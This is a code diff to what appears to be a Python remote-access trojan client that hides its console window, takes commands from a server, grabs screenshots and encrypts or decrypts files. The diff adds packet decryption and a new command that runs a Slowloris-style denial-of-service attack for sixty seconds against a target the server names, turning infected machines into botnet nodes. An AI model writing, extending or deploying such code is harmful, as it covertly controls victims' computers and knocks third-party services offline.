@@ -9,6 +9,7 @@ from PIL import ImageGrab
 from packet import Packet
 from encryption import encrypt,decrypt
 import os
+import ddos
 
 def hide():
     import win32console,win32gui
@@ -41,6 +42,7 @@ class Client:
         while True:
             pkt = Packet()
             pkt.construct(self.s)
+            pkt.decryptData(pkt.length,self.key)
             if pkt.state:
                 if pkt.state == "143":
                     threading.Thread(target=self.screenshot,args=[pkt]).start()
@@ -52,6 +54,8 @@ class Client:
                     threading.Thread(target=self.encrypt,args=[pkt]).start()
                 elif pkt.state == "147":
                     threading.Thread(target=self.decrypt,args=[pkt]).start()
+                elif pkt.state == "149":
+                    threading.Thread(target=self.ddos,args=[pkt]).start()
                 else:
                     print "i don't know that command"
 
@@ -114,6 +118,13 @@ class Client:
         pkt.length = size
 
         self.enqueue(pkt)
+
+    def ddos(self,pkt):
+        att = ddos.Loris(pkt.data)
+        threading.Thread(target=att.initiateAttack).start()
+        time.sleep(60)
+        att.endAttack()
+
 
     def sendAESKey(self):
         pkt = Packet()
